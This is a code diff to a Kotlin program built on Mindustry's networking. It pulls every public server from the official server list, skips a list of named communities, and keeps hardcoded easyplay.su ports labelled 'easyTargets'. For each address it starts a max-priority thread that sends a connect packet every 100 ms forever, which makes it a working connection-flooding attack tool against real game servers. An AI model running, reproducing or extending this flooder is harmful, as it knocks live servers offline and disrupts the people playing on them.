@@ -11,22 +11,38 @@ import mindustry.Vars
 import mindustry.core.*
 import mindustry.gen.Groups
 import mindustry.net.Packets.ConnectPacket
+import java.util.Timer
+import java.util.TimerTask
 
-// Entity.EntityBuilder(false, packet(), "easyplay.su", 6567, 6567)
+var forbiddenServers: Seq<String> = Seq.with("thedimas", "Darkdustry", "io", "Pandorum", "Fish", "OMNIDUSTRY", "Eradicationdustry", "Sectorized", "{AA}")
+var easyTargets = listOf(
+    "easyplay.su:6567",
+    "easyplay.su:6676",
+    "easyplay.su:6577",
+    "easyplay.su:6587",
+    "easyplay.su:6686",
+    "easyplay.su:6687"
+)
 
 fun main() {
     init()
+
+    val timer = Timer()
+    timer.scheduleAtFixedRate(object : TimerTask() {
+        override fun run() {
+            System.gc()
+        }
+
+    }, 0, 1000)
+
     val targets = listOfServes()
-    val easyTargets = listOf("easyplay.su:6567", "easyplay.su:6676", "easyplay.su:6577", "easyplay.su:6587", "easyplay.su:6686", "easyplay.su:6687")
-    easyTargets.forEach { target ->
+    targets.forEach { target ->
+        Log.info(target)
+
         val thread = Thread { task(target) }
+        thread.priority = Thread.MAX_PRIORITY;
         thread.start()
     }
-
-    /*for (i in 0..9) {
-        val thread = Thread { task("easyplay.su:6567") }
-        thread.start()
-    }*/
 }
 
 private fun init() {
@@ -64,32 +80,36 @@ private fun task(address: String) {
     val fullAddress = address.split(':')
     val ip = fullAddress[0].replace('"', ' ').replace(" ", "")
     val port = fullAddress[1].replace('"', ' ').replace(" ", "").toInt()
+
     while (true) {
         Entity.EntityBuilder(false, packet(), ip, port, port)
         Thread.sleep(100)
     }
-    while (true) {
 
-    }
+    while (true) {}
 }
 
-private fun listOfServes(): List<String> {
-    var output = listOf<String>()
+private fun listOfServes(): Seq<String> {
+    val output = Seq<String>()
     Http.get("https://raw.githubusercontent.com/Anuken/Mindustry/master/servers_v7.json")
+        .timeout(0)
         .error(Log::err)
-        .block { res: Http.HttpResponse ->
-            if (res.status == Http.HttpStatus.OK) {
-                val json = Jval.read(res.resultAsString)
-                json.asArray().forEach { server ->
-                    if (server.getString("name").lowercase() == "omnidustry") {
-                        val addresses = server.get("address")
-                            .toString()
-                            .replace('[', ' ')
-                            .replace(']', ' ')
-                            .split(',')
+        .block { res ->
+            val json = Jval.read(res.resultAsString)
+            json.asArray().forEach { server ->
+                val name: String = server.getString("name", "")
+                if (forbiddenServers.contains(name)) return@forEach
 
-                        output = addresses
-                    }
+                val addresses: Array<String> = if (server.has("addresses") || server.has("address") && server.get("address").isArray) {
+                    (if (server.has("addresses")) server.get("addresses") else server.get("address")).asArray()
+                        .map { obj: Jval -> obj.asString() }
+                        .toArray(String::class.java)
+                } else {
+                    arrayOf(server.getString("address", "<invalid>"))
+                }
+
+                for (target in addresses) {
+                    output.add(target)
                 }
             }
         }
